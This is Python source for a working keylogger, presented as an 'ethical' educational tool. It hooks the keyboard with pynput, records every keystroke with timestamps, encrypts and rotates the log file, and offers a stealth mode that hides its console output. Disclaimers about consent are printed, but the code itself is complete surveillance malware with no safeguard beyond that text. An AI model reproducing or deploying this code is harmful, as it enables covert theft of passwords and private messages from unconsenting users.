#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Professional Keylogger Implementation (Educational Purposes Only)
Created for Security Research and Ethical Awareness Training
"""

import os
import sys
import time
import platform
from pynput import keyboard
from cryptography.fernet import Fernet
import threading
from datetime import datetime

class EthicalKeylogger:
    """
    A professional keylogger implementation for educational purposes only.
    Includes encryption, stealth mode, and ethical usage controls.
    """
    
    def __init__(self, log_file="keystrokes.log", max_log_size=10000, stealth=False):
        """
        Initialize the keylogger with configurable parameters.
        
        Args:
            log_file (str): Path to the log file
            max_log_size (int): Maximum log size in bytes before rotation
            stealth (bool): Whether to run in stealth mode
        """
        self.log_file = log_file
        self.max_log_size = max_log_size
        self.stealth = stealth
        self.running = False
        self.keyboard_listener = None
        self.session_id = datetime.now().strftime("%Y%m%d%H%M%S")
        
        # Generate or load encryption key
        self.key = self._initialize_encryption()
        self.cipher = Fernet(self.key)
        
        # Display ethical disclaimer
        self._display_disclaimer()
        
    def _initialize_encryption(self):
        """Initialize encryption key for secure logging."""
        key_file = "encryption.key"
        if os.path.exists(key_file):
            with open(key_file, "rb") as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, "wb") as f:
                f.write(key)
            return key
    
    def _display_disclaimer(self):
        """Display ethical usage disclaimer."""
        disclaimer = """
        ETHICAL KEYLOGGER - EDUCATIONAL USE ONLY
        
        This software is intended solely for:
        - Security research
        - Ethical penetration testing
        - Defensive security training
        - Parental control (with consent)
        - Employee monitoring (with consent and legal approval)
        
        UNAUTHORIZED USE IS STRICTLY PROHIBITED.
        By using this software, you agree to use it only for lawful purposes
        and only with explicit consent from monitored individuals.
        
        Session ID: {}
        """.format(self.session_id)
        
        print(disclaimer)
        self._log_activity("\n" + disclaimer.strip() + "\n")
        
    def _log_activity(self, data):
        """
        Securely log activity with timestamp and encryption.
        
        Args:
            data (str): Data to be logged
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {data}\n"
        
        # Encrypt the log entry
        encrypted_entry = self.cipher.encrypt(log_entry.encode())
        
        # Check log size and rotate if needed
        if os.path.exists(self.log_file):
            if os.path.getsize(self.log_file) > self.max_log_size:
                self._rotate_log()
        
        # Write to log file
        with open(self.log_file, "ab") as f:
            f.write(encrypted_entry + b"\n")
    
    def _rotate_log(self):
        """Rotate log file when it reaches maximum size."""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        backup_file = f"{self.log_file}.{timestamp}.bak"
        os.rename(self.log_file, backup_file)
        self._log_activity(f"Log rotated to {backup_file}")
    
    def _on_press(self, key):
        """Callback for key press events."""
        try:
            # Handle special keys
            if key == keyboard.Key.space:
                key_str = " "
            elif key == keyboard.Key.enter:
                key_str = "\n"
            elif key == keyboard.Key.tab:
                key_str = "\t"
            elif key == keyboard.Key.backspace:
                key_str = "[BACKSPACE]"
            elif key == keyboard.Key.esc:
                key_str = "[ESC]"
            else:
                key_str = str(key).replace("'", "")
            
            self._log_activity(f"Key pressed: {key_str}")
            
        except Exception as e:
            self._log_activity(f"Error processing key: {str(e)}")
    
    def _on_release(self, key):
        """Callback for key release events."""
        if key == keyboard.Key.f12:
            # F12 key stops the listener
            self._log_activity("Stopping keylogger (F12 pressed)")
            return False
    
    def start(self):
        """Start the keylogger in a separate thread."""
        if self.running:
            return
            
        self.running = True
        self._log_activity("Keylogger started")
        
        # Start keyboard listener in a separate thread
        self.keyboard_listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release)
        
        listener_thread = threading.Thread(target=self.keyboard_listener.start)
        listener_thread.daemon = True
        listener_thread.start()
        
        if not self.stealth:
            print("Keylogger is running. Press F12 to stop.")
    
    def stop(self):
        """Stop the keylogger gracefully."""
        if not self.running:
            return
            
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        
        self.running = False
        self._log_activity("Keylogger stopped")
        
        if not self.stealth:
            print("Keylogger stopped.")

def main():
    """Main function to run the keylogger."""
    # Configuration
    config = {
        "log_file": "keystrokes.log",
        "max_log_size": 100000,  # 100KB
        "stealth": False
    }
    
    # Initialize keylogger
    keylogger = EthicalKeylogger(**config)
    
    try:
        # Start the keylogger
        keylogger.start()
        
        # Keep the main thread alive
        while keylogger.running:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nReceived keyboard interrupt. Stopping...")
    finally:
        keylogger.stop()

if __name__ == "__main__":
    # Check platform compatibility
    if platform.system() not in ["Windows", "Linux", "Darwin"]:
        print("Error: Unsupported operating system.")
        sys.exit(1)
    
    # Check for root/admin privileges
    if platform.system() != "Windows" and os.geteuid() != 0:
        print("Warning: Running without root privileges may limit functionality.")
    
    main()
